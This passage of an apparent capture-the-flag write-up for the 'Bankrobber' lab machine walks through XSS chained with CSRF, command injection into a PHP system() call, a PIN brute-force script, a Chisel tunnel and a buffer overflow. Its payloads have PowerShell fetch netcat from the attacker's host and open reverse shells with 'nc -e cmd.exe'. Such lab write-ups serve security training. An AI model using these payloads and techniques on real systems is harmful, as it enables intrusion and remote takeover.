+            <span class="k">if</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$good</span><span class="p">))</span> <span class="o">!=</span> <span class="nv">$good</span><span class="p">){</span>
+                <span class="k">die</span><span class="p">(</span><span class="s2">"It's only allowed to use the </span><span class="nv">$good</span><span class="s2"> command"</span><span class="p">);</span>
+            <span class="p">}</span>
+
+            <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"::1"</span><span class="p">){</span>
+                <span class="nb">system</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
+            <span class="p">}</span> <span class="k">else</span><span class="p">{</span>
+                <span class="k">echo</span> <span class="s2">"It's only allowed to access this function from localhost (::1).&lt;br&gt; This is due to the recent hack attempts on our server."</span><span class="p">;</span>
+            <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span><span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"You are not allowed to use this function!"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>To use this function, my cookies must show the I’m admin with the correct hardcoded password. Next, it checks the command for <code class="language-plaintext highlighter-rouge">$(</code> and <code class="language-plaintext highlighter-rouge">&amp;</code>, and fails if either are present. Next, as this is a Windows host, it checks that the first three characters of the command are <code class="language-plaintext highlighter-rouge">dir</code>. Finally, it checks that the remote address (the source of the request) is localhost, and if so, passes it to <code class="language-plaintext highlighter-rouge">system</code>.</p>
+<h3 id="xss--xsrf--shell">XSS + XSRF = Shell</h3>
+<p>I can easily escape the initial filters to run whatever I want using <code class="language-plaintext highlighter-rouge">;</code> or <code class="language-plaintext highlighter-rouge">|</code> to chain additional commands to <code class="language-plaintext highlighter-rouge">dir</code>. I need to figure out how to send my request from localhost.</p>
+<p>This is where I can use the XSS. In a real life scenario, this server likely wouldn’t be restricting access to localhost, but rather the internal network, or even just the admin subnet of that network. And the admin wouldn’t be checking the submissions from the server, but from a box that would likely be able to submit to backdoorchecker. But I’ll hypothesize that in this case, the admin user is on Bankrobber, and thus can submit requests to backdoorchecker from there.</p>
+<p>I’ll craft a Javascript payload that will issue the request to <code class="language-plaintext highlighter-rouge">/admin/backdoorchecker.php</code>, and call it <code class="language-plaintext highlighter-rouge">shell.js</code>:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">request</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
+<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">cmd=dir|powershell -c "iwr -uri 10.10.14.5/nc64.exe -outfile %temp%</span><span class="se">\\</span><span class="s1">n.exe"; %temp%</span><span class="se">\\</span><span class="s1">n.exe -e cmd.exe 10.10.14.5 443</span><span class="dl">'</span><span class="p">;</span>
+<span class="nx">request</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">http://localhost/admin/backdoorchecker.php</span><span class="dl">'</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="nx">request</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">request</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
+</code></pre></div></div>
+<p>This will get the admin user to make a request for me, which is a Cross-Site Request Forgery (XSRF) attack.</p>
+<p>I’ll submit the XSS payload to get <code class="language-plaintext highlighter-rouge">shell.js</code> through my logged in user, and wait for the payload to fire.:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://10.10.14.5/shell.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+</code></pre></div></div>
+<p>When it does, I’ll see a GET for <code class="language-plaintext highlighter-rouge">shell.js</code>, which will run, and issuing a POST to <code class="language-plaintext highlighter-rouge">/admin/backdoorchecker.php</code> with the parameters <code class="language-plaintext highlighter-rouge">cmd=dir|powershell -c "iwr -uri 10.10.14.5/nc64.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.14.5 443</code>. This will pass all the checks in <code class="language-plaintext highlighter-rouge">backdoorchecker.php</code>, and pass that on to <code class="language-plaintext highlighter-rouge">system</code>, which will run the <code class="language-plaintext highlighter-rouge">dir</code>, followed by the <code class="language-plaintext highlighter-rouge">powershell</code> to download <code class="language-plaintext highlighter-rouge">nc64.exe</code> from my server, save it in <code class="language-plaintext highlighter-rouge">%temp%</code>. Then my commands have it run <code class="language-plaintext highlighter-rouge">nc</code> to connect back to me with a shell.</p>
+<p>After a few minutes, that’s exactly what I see:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.10.154 - - [22/Sep/2019 06:50:55] "GET /shell.js HTTP/1.1" 200 -
+10.10.10.154 - - [22/Sep/2019 06:50:58] "GET /nc64.exe HTTP/1.1" 200 -
+</span></code></pre></div></div>
+<p>And then a shell on my waiting <code class="language-plaintext highlighter-rouge">nc</code> listener (always use <code class="language-plaintext highlighter-rouge">rlwrap</code> with windows):</p>
+<div class="language-console rlwrap-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>rlwrap nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.154.
+Ncat: Connection from 10.10.10.154:52036.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.
+
+</span><span class="gp">C:\xampp\htdocs\admin&gt;</span><span class="nb">whoami</span>
+<span class="go">whoami
+bankrobber\cortin
+</span></code></pre></div></div>
+<p>And now I can grab <code class="language-plaintext highlighter-rouge">user.txt</code> (if I didn’t grab it with sqli before):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\Cortin\Desktop&gt;</span><span class="nb">type </span>user.txt
+<span class="go">f6353466************************
+</span></code></pre></div></div>
+<h2 id="priv-cortin--system">Priv: cortin –&gt; system</h2>
+<h3 id="enumeration">Enumeration</h3>
+<p>The only thing I really found of interest on the filesystem was a binary at the drive root, <code class="language-plaintext highlighter-rouge">bankv2.exe</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\&gt;</span><span class="nb">dir</span>
+<span class="go">dir
+ Volume in drive C has no label.
+ Volume Serial Number is C80C-B6D3
+
+ Directory of C:\
+
+25-04-2019  19:50            57.937 bankv2.exe
+25-04-2019  00:27    &lt;DIR&gt;          PerfLogs
+22-08-2019  20:04    &lt;DIR&gt;          Program Files
+27-04-2019  16:02    &lt;DIR&gt;          Program Files (x86)
+24-04-2019  18:52    &lt;DIR&gt;          Users
+16-08-2019  17:29    &lt;DIR&gt;          Windows
+25-04-2019  00:18    &lt;DIR&gt;          xampp
+               1 File(s)         57.937 bytes
+               6 Dir(s)  43.634.270.208 bytes free
+</span></code></pre></div></div>
+<p>Unfortunately, I can’t access it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\&gt;</span>icacls bankv2.exe
+<span class="go">icacls bankv2.exe
+bankv2.exe: Toegang geweigerd.
+Successfully processed 0 files; Failed processing 1 files
+
+</span><span class="gp">C:\&gt;</span>cacls bankv2.exe
+<span class="go">cacls bankv2.exe
+C:\bankv2.exe
+Toegang geweigerd.
+</span></code></pre></div></div>
+<p>Google Translate tells me “Toegang geweigerd.” is “Access denied.” in Dutch.</p>
+<p>After looking around the filesystem and not finding much, I eventually checked the <code class="language-plaintext highlighter-rouge">netstat</code> for listening ports:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\&gt;</span>netstat <span class="nt">-ano</span> | findstr LISTENING
+<span class="go">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       1108
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       732
+  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       1108
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:910            0.0.0.0:0              LISTENING       1488
+  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1868
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       456
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       888
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       840
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1364
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       576
+  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       588
+  TCP    10.10.10.154:139       0.0.0.0:0              LISTENING       4
+  TCP    [::]:80                [::]:0                 LISTENING       1108
+  TCP    [::]:135               [::]:0                 LISTENING       732
+  TCP    [::]:443               [::]:0                 LISTENING       1108
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:3306              [::]:0                 LISTENING       1868
+  TCP    [::]:49664             [::]:0                 LISTENING       456
+  TCP    [::]:49665             [::]:0                 LISTENING       888
+  TCP    [::]:49666             [::]:0                 LISTENING       840
+  TCP    [::]:49667             [::]:0                 LISTENING       1364
+  TCP    [::]:49668             [::]:0                 LISTENING       576
+  TCP    [::]:49669             [::]:0                 LISTENING       588
+</span></code></pre></div></div>
+<p>910 jumped out at me as something I hadn’t seen in my initial <code class="language-plaintext highlighter-rouge">nmap</code>. It’s running with PID 1488, which is <code class="language-plaintext highlighter-rouge">bankv2.exe</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\&gt;</span>tasklist
+<span class="go">
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+...[snip]...
+bankv2.exe                    1488                            0        136 K
+...[snip]...
+</span></code></pre></div></div>
+<p>I can use <code class="language-plaintext highlighter-rouge">nc</code> that I uploaded to talk to this port. When I connected, it hung for a moment, but when I hit enter, it continued:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\&gt;</span>%temp%<span class="se">\n</span>.exe 127.0.0.1 910
+<span class="go">
+ --------------------------------------------------------------
+ Internet E-Coin Transfer System
+ International Bank of Sun church
+                                        v0.1 by Gio &amp; Cneeliz
+ --------------------------------------------------------------
+ Please enter your super secret 4 digit PIN code to login:
+</span><span class="gp"> [$]</span><span class="w"> 
+</span></code></pre></div></div>
+<p>When I enter a pin at random, I get denied:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp"> [$]</span><span class="w"> </span>1234
+<span class="gp"> [!]</span><span class="w"> </span>Access denied, disconnecting client....
+</code></pre></div></div>
+<h3 id="tunnel">Tunnel</h3>
+<p>I’m going to script a brute force attack on the pin, but I don’t want to do that from Windows. I’ll create a tunnel using <code class="language-plaintext highlighter-rouge">chisel</code> (I’ve written a <a href="/cheatsheets/chisel">post</a> about the awesomeness that is <a href="https://github.com/jpillora/chisel">Chisel</a> before). With a copy of the amd65 compiled binary from the <a href="https://github.com/jpillora/chisel/releases">release page</a> in my webserver directory, I’ll get it on Bankrobber in cortin’s temp directory:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\Cortin\AppData\Local\Temp&gt;</span>powershell <span class="nt">-c</span> <span class="s2">"wget 10.10.14.5/chisel_windows_amd64.exe -o c.exe"</span>
+</code></pre></div></div>
+<p>It takes a minute to upload, and while it’s doing that, I’ll start the server on my box:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/opt/chisel# </span>./chisel server <span class="nt">-p</span> 8000 <span class="nt">--reverse</span>
+<span class="go">2019/09/24 03:17:12 server: Reverse tunnelling enabled
+2019/09/24 03:17:12 server: Fingerprint 80:44:a6:92:c1:bb:c8:5f:64:b7:2e:34:2f:5e:56:05
+2019/09/24 03:17:12 server: Listening on 0.0.0.0:8000...
+</span></code></pre></div></div>
+<p>Now <code class="language-plaintext highlighter-rouge">chisel</code> is listening on 8000, and will allow reverse tunnels, which is what I’ll create next:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\Cortin\AppData\Local\Temp&gt;</span>c.exe client 10.10.14.5:8000 R:910:localhost:910
+<span class="go">2019/09/24 10:21:04 client: Connecting to ws://10.10.14.5:8000
+2019/09/24 10:21:05 client: Fingerprint 80:44:a6:92:c1:bb:c8:5f:64:b7:2e:34:2f:5e:56:05
+2019/09/24 10:21:05 client: Connected (Latency 24.9252ms)
+</span></code></pre></div></div>
+<p>This will create a listener on my local box on port 910, which will forward traffic through chisel to localhost on Bankrobber port 910.</p>
+<p>I see the connection on my server:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">2019/09/24 03:21:50 server: proxy#1:R:0.0.0.0:910=&gt;localhost:910: Listening
+</span></code></pre></div></div>
+<p>And I can test the tunnel with <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc localhost 910
+<span class="go"> --------------------------------------------------------------
+ Internet E-Coin Transfer System
+ International Bank of Sun church
+                                        v0.1 by Gio &amp; Cneeliz
+ --------------------------------------------------------------
+ Please enter your super secret 4 digit PIN code to login:
+</span><span class="gp"> [$]</span><span class="w"> </span>0000
+<span class="gp"> [!]</span><span class="w"> </span>Access denied, disconnecting client....
+</code></pre></div></div>
+<h3 id="brute-force-pin">Brute Force Pin</h3>
+<p>I’ll write a Python script to brute force the pin. It will use <code class="language-plaintext highlighter-rouge">socket</code> to connect to localhost:910, send the pin and a newline, and check for “Access denied” in the response. If it’s not there, It will print the pin and break. To make it a bit neater, I’ll add a line that prints the current number being tried, overwriting itself each time to not flood my screen:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">import</span> <span class="n">sys</span>
+
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">):</span>
+    <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\r</span><span class="s">Trying: </span><span class="si">{</span><span class="n">i</span><span class="si">:</span><span class="mi">04</span><span class="n">d</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span><span class="p">,</span> <span class="mi">910</span><span class="p">))</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">i</span><span class="si">:</span><span class="mi">04</span><span class="n">d</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">())</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="sa">b</span><span class="sh">"</span><span class="s">Access denied</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\r</span><span class="s">Found pin: </span><span class="si">{</span><span class="n">i</span><span class="si">:</span><span class="mi">04</span><span class="n">d</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+        <span class="k">break</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div></div>
+<p>When I run this, it finds the pin of 0021:</p>
+<p><img alt="brute pin" src="https://0xdfimages.gitlab.io/img/bankrobber-brute-pin.gif"/></p>
+<h3 id="overflow">Overflow</h3>
+<p>Now with the pin, I can look at the rest of the app:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc localhost 910
+<span class="go"> --------------------------------------------------------------
+ Internet E-Coin Transfer System
+ International Bank of Sun church
+                                        v0.1 by Gio &amp; Cneeliz
+ --------------------------------------------------------------
+ Please enter your super secret 4 digit PIN code to login:
+</span><span class="gp"> [$]</span><span class="w"> </span>0021
+<span class="gp"> [$]</span><span class="w"> </span>PIN is correct, access granted!
+<span class="go"> --------------------------------------------------------------
+ Please enter the amount of e-coins you would like to transfer:
+</span><span class="gp"> [$]</span><span class="w"> </span>12 
+<span class="gp"> [$]</span><span class="w"> </span>Transfering <span class="nv">$12</span> using our e-coin transfer application. 
+<span class="gp"> [$]</span><span class="w"> </span>Executing e-coin transfer tool: C:<span class="se">\U</span>sers<span class="se">\a</span>dmin<span class="se">\D</span>ocuments<span class="se">\t</span>ransfer.exe
+<span class="go">
+</span><span class="gp"> [$]</span><span class="w"> </span>Transaction <span class="k">in </span>progress, you can safely disconnect...
+</code></pre></div></div>
+<p>It’s quite simple. If I enter an invalid string, it just say the same thing:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc localhost 910
+<span class="go"> --------------------------------------------------------------
+ Internet E-Coin Transfer System
+ International Bank of Sun church
+                                        v0.1 by Gio &amp; Cneeliz
+ --------------------------------------------------------------
+ Please enter your super secret 4 digit PIN code to login:
+</span><span class="gp"> [$]</span><span class="w"> </span>0021
+<span class="gp"> [$]</span><span class="w"> </span>PIN is correct, access granted!
+<span class="go"> --------------------------------------------------------------
+ Please enter the amount of e-coins you would like to transfer:
+</span><span class="gp"> [$]</span><span class="w"> </span>abcd
+<span class="gp"> [$]</span><span class="w"> </span>Transfering <span class="nv">$abcd</span> using our e-coin transfer application. 
+<span class="gp"> [$]</span><span class="w"> </span>Executing e-coin transfer tool: C:<span class="se">\U</span>sers<span class="se">\a</span>dmin<span class="se">\D</span>ocuments<span class="se">\t</span>ransfer.exe
+<span class="go">
+</span><span class="gp"> [$]</span><span class="w"> </span>Transaction <span class="k">in </span>progress, you can safely disconnect...
+</code></pre></div></div>
+<p>When I enter a long string, I notice something weird:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc localhost 910
+<span class="go"> --------------------------------------------------------------
+ Internet E-Coin Transfer System
+ International Bank of Sun church
+                                        v0.1 by Gio &amp; Cneeliz
+ --------------------------------------------------------------
+ Please enter your super secret 4 digit PIN code to login:
+</span><span class="gp"> [$]</span><span class="w"> </span>0021
+<span class="gp"> [$]</span><span class="w"> </span>PIN is correct, access granted!
+<span class="go"> --------------------------------------------------------------
+ Please enter the amount of e-coins you would like to transfer:
+</span><span class="gp"> [$]</span><span class="w"> </span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+<span class="gp"> [$]</span><span class="w"> </span>Transfering <span class="nv">$AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span> using our e-coin transfer application. 
+<span class="gp"> [$]</span><span class="w"> </span>Executing e-coin transfer tool: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+<span class="go">
+</span><span class="gp"> [$]</span><span class="w"> </span>Transaction <span class="k">in </span>progress, you can safely disconnect...
+</code></pre></div></div>
+<p>It seems to overflow the name of the executable that’s running. The name of the executable must be stored on the stack, and this overflow is overwriting it. I’ll examine the binary in <a href="#bankv2exe">Beyond Root</a>. I can use <code class="language-plaintext highlighter-rouge">msf-pattern_create</code> to get a pattern and submit it as the amount:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>msf-pattern_create <span class="nt">-l</span> 40
+<span class="go">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A
+
+</span><span class="gp">root@kali#</span><span class="w"> </span>nc localhost 910
+<span class="go"> --------------------------------------------------------------
+ Internet E-Coin Transfer System
+ International Bank of Sun church
+                                        v0.1 by Gio &amp; Cneeliz
+ --------------------------------------------------------------
+ Please enter your super secret 4 digit PIN code to login:
+</span><span class="gp"> [$]</span><span class="w"> </span>0021
+<span class="gp"> [$]</span><span class="w"> </span>PIN is correct, access granted!
+<span class="go"> --------------------------------------------------------------
+ Please enter the amount of e-coins you would like to transfer:
+</span><span class="gp"> [$]</span><span class="w"> </span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A
+<span class="gp"> [$]</span><span class="w"> </span>Transfering <span class="nv">$Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A</span> using our e-coin transfer application. 
+<span class="gp"> [$]</span><span class="w"> </span>Executing e-coin transfer tool: 0Ab1Ab2A
+<span class="go">
+</span><span class="gp"> [$]</span><span class="w"> </span>Transaction <span class="k">in </span>progress, you can safely disconnect...
+</code></pre></div></div>
+<p>Now I can submit the first four bytes to <code class="language-plaintext highlighter-rouge">msf-pattern_offset</code> and get the offset:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>msf-pattern_offset <span class="nt">-q</span> 0Ab1
+<span class="go">[*] Exact match at offset 32
+</span></code></pre></div></div>
+<p>I already have <code class="language-plaintext highlighter-rouge">nc</code> located at <code class="language-plaintext highlighter-rouge">\Users\Cortin\AppData\Local\Temp\n.exe</code>. I’ll try to overwrite the call with that. I’ll create a payload:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>python <span class="nt">-c</span> <span class="s1">'print "A"*32 + "\\Users\\Cortin\\AppData\\Local\\Temp\\n.exe -e cmd.exe 10.10.14.5 443"'</span>
+<span class="go">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\Users\Cortin\AppData\Local\Temp\n.exe -e cmd.exe 10.10.14.5 443
+</span></code></pre></div></div>
+<p>Now, with a <code class="language-plaintext highlighter-rouge">nc</code> listening waiting, I’ll submit it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nc localhost 910
+<span class="go"> --------------------------------------------------------------
+ Internet E-Coin Transfer System
+ International Bank of Sun church
+                                        v0.1 by Gio &amp; Cneeliz
+ --------------------------------------------------------------
+ Please enter your super secret 4 digit PIN code to login:
+</span><span class="gp"> [$]</span><span class="w"> </span>0021
+<span class="gp"> [$]</span><span class="w"> </span>PIN is correct, access granted!
+<span class="go"> --------------------------------------------------------------
+ Please enter the amount of e-coins you would like to transfer:
+</span><span class="gp"> [$]</span><span class="w"> </span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span class="se">\U</span>sers<span class="se">\C</span>ortin<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\n</span>.exe <span class="nt">-e</span> cmd.exe 10.10.14.5 443
+<span class="gp"> [$]</span><span class="w"> </span>Transfering <span class="nv">$AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="se">\U</span>sers<span class="se">\C</span>ortin<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\n</span>.exe <span class="nt">-e</span> cmd.exe 10.10.14.5 443 using our e-coin transfer application. 
+<span class="gp"> [$]</span><span class="w"> </span>Executing e-coin transfer tool: <span class="se">\U</span>sers<span class="se">\C</span>ortin<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\n</span>.exe <span class="nt">-e</span> cmd.exe 10.10.14.5 443
+<span class="go">
+</span><span class="gp"> [$]</span><span class="w"> </span>Transaction <span class="k">in </span>progress, you can safely disconnect...
+</code></pre></div></div>
+<p>The transfer tool looks right. And I have a shell as system:</p>
+<div class="language-console rlwrap-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>rlwrap nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.154.
+Ncat: Connection from 10.10.10.154:50224.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.
+
+</span><span class="gp">C:\Windows\system32&gt;</span><span class="nb">whoami</span>
+<span class="go">whoami
+nt authority\system
+</span></code></pre></div></div>
+<p>From there, I can grab <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\admin\Desktop&gt;</span><span class="nb">type </span>root.txt
+<span class="go">aa65d8e6************************
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="admin-request">Admin request</h3>
+<p>I always like to check out how creators script user activity. I’ll check out the scheduled tasks:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\admin\Desktop&gt;</span>schtasks /query                                    
+<span class="go">...[snip]...
+Folder: \bankrobber                                                            
+TaskName                                 Next Run Time          Status  
+======================================== ====================== ===============
+Admin request                            24-9-2019 11:06:05     Ready          
+bankapp                                  N/A                    Running        
+Kill hanging phantom                     24-9-2019 11:06:50     Ready          
+Truncate comments                        24-9-2019 11:06:14     Ready          
+XAMPP start on boot                      N/A                    Running
+...[snip]...
+</span></code></pre></div></div>
+<p>I’ll grab the details for “Admin request”:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\admin\Desktop&gt;</span>schtasks /query /TN <span class="s2">"bankrobber</span><span class="se">\a</span><span class="s2">dmin request"</span> /v /FO list
+<span class="go">
+Folder: bankrobber
+HostName:                             BANKROBBER
+TaskName:                             bankrobber\admin request
+Next Run Time:                        24-9-2019 11:10:05
+Status:                               Ready
+Logon Mode:                           Interactive/Background
+Last Run Time:                        24-9-2019 11:07:08
+Last Result:                          0
+Author:                               DESKTOP-62OTOFV\admin
+Task To Run:                          C:\Users\admin\Documents\phantomjs\bin\phantomjs.exe C:\Users\admin\Documents\phantomjs\bin\get.js
+Start In:                             N/A
+Comment:                              Simulate an admin request with PhantomJS
+Scheduled Task State:                 Enabled
+Idle Time:                            Disabled
+Power Management:                     Stop On Battery Mode
+Run As User:                          admin
+Delete Task If Not Rescheduled:       Disabled
+Stop Task If Runs X Hours and X Mins: 72:00:00
+Schedule:                             Scheduling data is not available in this format.
+Schedule Type:                        Daily 
+Start Time:                           17:06:05
+Start Date:                           16-8-2019
+End Date:                             N/A
+Days:                                 Every 1 day(s)
+Months:                               N/A
+Repeat: Every:                        0 Hour(s), 4 Minute(s)
+Repeat: Until: Time:                  None
+Repeat: Until: Duration:              24 Hour(s), 0 Minute(s)
+Repeat: Stop If Still Running:        Disabled
+</span></code></pre></div></div>
+<p>This task is using the <a href="https://phantomjs.org/">PhantomJS</a> scriptable headless browser to load some javascript, <code class="language-plaintext highlighter-rouge">get.js</code>:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">page</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">webpage</span><span class="dl">'</span><span class="p">).</span><span class="nf">create</span><span class="p">();</span>
+
+<span class="kd">function</span> <span class="nf">newCookie</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span><span class="nx">value</span><span class="p">){</span>
+    <span class="nx">phantom</span><span class="p">.</span><span class="nf">addCookie</span><span class="p">({</span>
+        <span class="dl">'</span><span class="s1">name</span><span class="dl">'</span>   <span class="p">:</span> <span class="nx">name</span><span class="p">,</span>
